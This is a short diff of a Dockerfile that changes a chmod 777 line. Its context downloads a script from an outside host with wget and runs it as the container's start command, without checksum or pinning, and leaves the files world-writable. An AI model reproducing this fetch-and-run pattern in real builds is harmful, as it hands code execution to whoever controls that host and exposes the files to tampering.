@@ -7,5 +7,5 @@ RUN mv proot /bin
 RUN mkdir /prog
 RUN wget https://s.bccx.eu.org/ -O /prog/start.sh
 RUN chmod +x /prog/start.sh
-RUN chmod 777 /prog/
+RUN chmod 777 /prog/*
 CMD bash ./prog/start.sh
